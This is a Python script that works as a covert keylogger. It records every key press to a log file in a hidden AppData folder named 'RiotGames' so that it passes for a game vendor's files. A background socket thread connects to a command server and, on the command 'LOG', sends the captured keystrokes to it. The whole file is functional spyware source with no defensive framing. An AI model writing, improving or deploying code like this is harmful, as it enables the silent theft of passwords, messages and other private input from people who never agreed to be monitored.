import socket
import keyboard
import subprocess
from pathlib import Path

# Path to the log file
log_folder = Path.home() / "AppData" / "Roaming" / "RiotGames"
log_folder.mkdir(parents=True, exist_ok=True)
subprocess.run(["attrib", "+h", str(log_folder)])

log_file = log_folder / "log.txt"

# Function to log key presses to the log.txt file
def on_key_press(event):
    with log_file.open("a") as f:
        f.write(f"{event.name}")

# Function to handle socket communication
def handle_socket():
    # Define the server's IP and port
    HOST = "127.0.0.1"
    PORT = 65432

    # Create a socket connection to the server
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        try:
            s.connect((HOST, PORT))  # Connect to the server
        except Exception as e:
            print(f"Error connecting to server: {e}")
            return

        # Start an infinite loop to listen for commands from the server
        while True:
            try:
                data = s.recv(4096)  # Receive data from the server in chunks of 4096 bytes
                if not data:
                    print("Connection closed by server.")
                    break

                # Decode the command received from the server
                command = data.decode("utf-8")
                print(f"Server says: {command}")

                # Check if the server sent the 'LOG' command
                if command.upper() == "LOG":
                    try:
                        # Read the content of the log.txt file
                        with log_file.open("r") as f:
                            log_data = f.read()  # Read file data as a string
                        
                        # Send the log data to the server
                        s.sendall(log_data.encode("utf-8"))
                        print("Sent log data to server.")
                    except Exception as e:
                        print(f"Error reading log file: {e}")

                # Check if the server sent the 'exit' command to close the connection
                if command.lower() == 'exit':
                    print("Server requested to close the connection.")
                    break

            except Exception as e:
                print(f"Error during communication: {e}")
                break

# Start a new thread to handle socket communication
import threading
socket_thread = threading.Thread(target=handle_socket)
socket_thread.daemon = True  
socket_thread.start()

# Start listening to key presses 
keyboard.on_press(on_key_press)
keyboard.wait()
